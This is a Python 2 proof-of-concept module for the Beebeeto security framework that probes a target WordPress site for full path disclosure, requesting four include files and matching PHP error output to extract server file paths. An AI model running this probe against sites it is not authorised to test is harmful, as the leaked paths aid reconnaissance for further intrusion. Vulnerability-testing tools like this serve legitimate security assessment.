#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0134',
            'name': 'Wordpress full Path Disclosure Vulnerability POC',
            'author': 'foundu',
            'create_date': '2014-11-01',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Wordpress信息泄露', 'Wordpress爆路径', 'php'],
            'desc': 'N/A',
            'references': ['https://www.yascanner.com/#!/n/53',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        file_list =  ['/wp-includes/registration-functions.php',
                      '/wp-includes/registration.php',
                      '/wp-includes/user.php',
                      '/wp-includes/rss-functions.php',]
        args['poc_ret']['file_path'] = []
        for filename in file_list:
            verify_url = args['options']['target'] + filename
            try:
                if args['options']['verbose']:
                    print '[*] Requst URL: ' + verify_url
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            m = re.search('</b>:[^\r\n]+ in <b>([^<]+)</b> on line <b>(\d+)</b>', content)
            if m:
                args['success'] = True
                args['poc_ret']['file_path'].append(verify_url)
        if not args['poc_ret']['file_path']:
            args['poc_ret'].pop('file_path')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())